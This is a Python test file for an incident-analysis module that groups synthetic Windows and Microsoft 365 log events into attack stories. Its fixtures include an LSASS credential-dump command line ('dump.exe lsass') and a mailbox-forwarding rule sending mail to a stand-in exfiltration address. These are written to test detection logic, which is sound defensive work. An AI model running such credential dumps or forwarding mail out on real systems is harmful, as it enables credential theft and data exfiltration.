"""Who is who and where, on cases built to mislead it: one host name in two domains, a shared
account, an office's NAT address, and a flag in SYSTEM's context on a host where a person is
seated. Every name, host and address is invented (example domains, documentation ranges)."""

from __future__ import annotations

from services.analysis.identity import MEDIUM
from services.analysis.stories import build_stories

SEC = {"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"}
SYSMON = {"provider": "Microsoft-Windows-Sysmon", "channel": "Microsoft-Windows-Sysmon/Operational"}
ENTRA = {"provider": "Microsoft Entra ID Sign-in", "category": "Entra sign-in", "operation": "SignIn"}
UAL = {"provider": "Microsoft 365 Unified Audit Log", "category": "M365 Exchange"}
OFFICE = "198.51.100.7"
T0 = 1_788_510_000_000
SETTINGS = {"internal_domains": ["a.example", "b.example"]}


def ev(n, minutes, base=SEC, **fields):
    return {"id": n, "ts": T0 + int(minutes * 60_000), **base, **fields}


def sign_in(n, minutes, who, ip, status="0"):
    upn = f"{who}@a.example"
    return ev(n, minutes, base=ENTRA, user=upn, upn=upn, subjectUser=upn, targetUser=upn, ipAddress=ip, status=status)


def finding(rule, severity, refs, tags=(), **entities):
    return {
        "ruleId": rule,
        "title": rule.replace("-", " "),
        "severity": severity,
        "source": "events",
        "refs": list(refs),
        "tags": list(tags),
        "attack": [],
        "entities": entities,
        "key": f"{rule}|{refs[0]}",
    }


def _refs(story):
    return {r for st in story["steps"] for r in st["refs"]}


def _by_ref(story):
    return {r: st for st in story["steps"] for r in st["refs"]}


def test_a_host_name_two_domains_share_is_two_hosts_and_a_logon_id_of_one_is_not_the_others():
    """Forests a.example and b.example each have a DC01, and the same logon id is alice's in one and
    a program's in the other. Read by short name, the two were one host, and the program on b's DC01
    ran in alice's session."""
    events = [
        ev(1, 0, eventId=4624, computer="DC01.a.example", targetUser="alice", targetDomain="A", targetLogonId="0x77", logonType=10, ipAddress="10.1.0.5"),
        ev(2, 5, eventId=4698, computer="DC01.a.example", subjectUser="alice", subjectDomain="A", subjectLogonId="0x77", taskName="\\Updater"),
        ev(3, 6, base=SYSMON, eventId=1, computer="DC01.b.example", processGuid="{b0000000-0000-0000-0000-000000000003}",
           image="C:\\Windows\\Temp\\dump.exe", commandLine="dump.exe lsass", processId="4242", data={"LogonId": "0x77"}),
    ]  # fmt: skip
    findings = [finding("win-scheduled-task", "high", [2], tags=["persistence"]), finding("win-lsass-dump", "critical", [3], tags=["credential-access"])]
    res = build_stories(events, [], findings, SETTINGS)
    by_subject = {s["subject"]["id"] if s["kind"] == "host" else s["subject"]["label"]: s for s in res["stories"]}
    assert set(by_subject) == {"a\\alice", "dc01.b.example"}
    alice = by_subject["a\\alice"]
    assert "event:3" not in _refs(alice) and alice["hosts"] == ["dc01.a.example"]
    assert "event:3" in _refs(by_subject["dc01.b.example"])
    hosts = {h["key"]: h for h in res["hosts"]}
    assert hosts["dc01.a.example"]["basis"] == "keyed by its full name, dc01.a.example: the case names 2 hosts DC01 (dc01.a.example, dc01.b.example)"


def test_a_flag_in_systems_context_on_a_host_where_a_person_is_seated_is_not_theirs():
    """Bob is at WS-01's console and raises a flag of his own; ten minutes later the machine's own
    account creates a scheduled task (a management agent, as SYSTEM). The task's record names the
    machine and SYSTEM's logon, not bob: it is the host's, and the host's story is linked to his."""
    ws = "WS-01.a.example"
    bob = dict(subjectUser="bob", subjectDomain="A", subjectLogonId="0x5150")
    events = [
        ev(1, 0, eventId=4624, computer=ws, targetUser="bob", targetDomain="A", targetLogonId="0x5150", logonType=2),
        ev(2, 10, eventId=4732, computer=ws, memberSid="S-1-5-21-1-2-3-1104", **bob),
        ev(3, 20, eventId=4698, computer=ws, subjectUser="WS-01$", subjectDomain="A", subjectLogonId="0x3e7", taskName="\\AgentUpdate"),
        ev(4, 30, eventId=4688, computer=ws, processName="C:\\Windows\\System32\\notepad.exe", newProcessId="0x44", **bob),
    ]  # fmt: skip
    findings = [
        finding("win-user-added-privileged-group", "medium", [2], tags=["persistence"]),
        finding("win-scheduled-task", "high", [3], tags=["persistence"]),
    ]
    res = build_stories(events, [], findings, SETTINGS)
    by_subject = {s["subject"]["id"] if s["kind"] == "host" else s["subject"]["label"]: s for s in res["stories"]}
    assert set(by_subject) == {"a\\bob", "ws-01"}
    assert "event:3" not in _refs(by_subject["a\\bob"])
    task = _by_ref(by_subject["ws-01"])["event:3"]
    assert task["tie"]["basis"] == (
        "a finding on ws-01 while a\\bob's session 0x5150 was open (its logoff is not in the evidence: taken as open to its last record, "
        "30 min after its logon); its record ties it to no account or session of theirs"
    )
    [link] = by_subject["ws-01"]["links"]
    assert (link["story"], link["kind"], link["confidence"]) == (by_subject["a\\bob"]["id"], "session", MEDIUM)


def test_an_office_address_one_medium_finding_names_pulls_no_one_into_the_story():
    """Alice's sign-in from the office is flagged (a false positive of one rule). Bob signs in from
    the same address and dave mistypes his password there: the address is not the attacker's, so
    neither alice's other sign-ins from it nor dave's failure join her story, and it says why."""
    events = [
        sign_in(1, 0, "alice", OFFICE),
        sign_in(2, 60, "alice", OFFICE),
        sign_in(3, 61, "bob", OFFICE),
        sign_in(4, 62, "dave", OFFICE, status="50126"),
    ]
    findings = [finding("m365-signin-unfamiliar", "medium", [1], tags=["initial-access"], ipAddress=OFFICE)]
    res = build_stories(events, [], findings, SETTINGS)
    [story] = res["stories"]
    assert story["attackerAddresses"] == [] and story["untiedAddresses"] == [OFFICE] and _refs(story) == {"event:1"}
    assert f"The findings also name {OFFICE}, which others in the case use and no high finding or second rule names" in story["summary"]
    assert res["campaigns"] == []


def test_a_shared_account_is_read_from_the_attackers_address_not_from_the_office_it_shares():
    """frontdesk is one account three receptionists use from the office, as alice does. An outside
    address signs in to it (a high finding), sets its mailbox to forward (critical), reads the
    mailbox and tries carol's account: those join its story, each saying why the address is the
    attacker's. A false positive on one of its office sign-ins ties none of the others."""
    attacker = "203.0.113.80"
    desk = "frontdesk@a.example"
    events = [
        *[sign_in(n, n, "frontdesk", OFFICE) for n in (1, 2, 3)],
        sign_in(4, 4, "alice", OFFICE),
        sign_in(10, 30, "frontdesk", attacker),
        ev(11, 35, base=UAL, operation="Set-Mailbox", user=desk, upn=desk, subjectUser=desk, ipAddress=attacker,
           summary=f"Set-Mailbox by {desk} from {attacker} ForwardingSmtpAddress=smtp:drop@exfil.example"),
        ev(12, 40, base=UAL, operation="MailItemsAccessed", user=desk, upn=desk, subjectUser=desk, ipAddress=attacker),
        sign_in(13, 45, "carol", attacker, status="50126"),
    ]  # fmt: skip
    findings = [
        finding("m365-signin-unfamiliar", "medium", [2], tags=["initial-access"], ipAddress=OFFICE),
        finding("m365-signin-risky", "high", [10], tags=["initial-access"], ipAddress=attacker),
        finding("m365-mailbox-forwarding", "critical", [11], tags=["collection"], ipAddress=attacker),
    ]
    res = build_stories(events, [], findings, SETTINGS)
    [story] = res["stories"]
    assert story["subject"]["label"] == desk and story["attackerAddresses"] == [attacker] and story["untiedAddresses"] == [OFFICE]
    by_ref = _by_ref(story)
    why = "a critical finding names it: m365 mailbox forwarding"
    assert by_ref["event:12"]["tie"]["basis"] == f"it came from {attacker}, a source the story's findings name ({why})"
    assert by_ref["event:13"]["tie"]["basis"] == f"the same source, {attacker}, in the same days ({why}); it tried another account"
    # the receptionists' other sign-ins from the office are not the attacker's
    assert not {"event:1", "event:3", "event:4"} & set(by_ref)


def test_a_small_tenants_office_is_its_shared_egress_even_when_a_high_finding_names_it():
    """Alice, bob and carol are all the tenant signs in from outside, all from the office. A high
    false positive on alice's sign-in names the office address: two of three signing in from it
    with nothing flagged make it the tenant's own egress, which ties nothing."""
    events = [sign_in(1, 0, "alice", OFFICE), sign_in(2, 30, "alice", OFFICE), sign_in(3, 5, "bob", OFFICE), sign_in(4, 6, "carol", OFFICE)]
    findings = [finding("m365-impossible-travel", "high", [1], tags=["initial-access"], ipAddress=OFFICE)]
    [story] = build_stories(events, [], findings, SETTINGS)["stories"]
    assert story["sharedAddresses"] == [OFFICE] and story["attackerAddresses"] == [] and _refs(story) == {"event:1"}
